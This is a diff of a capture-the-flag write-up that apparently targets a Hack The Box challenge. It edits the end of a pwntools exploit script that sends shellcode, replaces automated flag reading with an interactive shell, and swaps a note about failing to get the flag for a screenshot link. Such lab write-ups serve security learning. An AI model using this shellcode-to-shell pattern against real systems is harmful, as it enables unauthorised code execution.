@@ -63,8 +63,13 @@ r.sendlineafter('>', sc)
 
 # Get flag
 pause(1)
-r.sendline('cat flag*')
-print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
+
+# Interact with the shell
+r.interactive()
+
+# Don't know why, but the following doesn't work
+#r.sendline('cat flag*')
+#print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
 ```
 
-> I don't know why, but I can't get the flag
+![](Pasted%20image%2020241023232307.png)
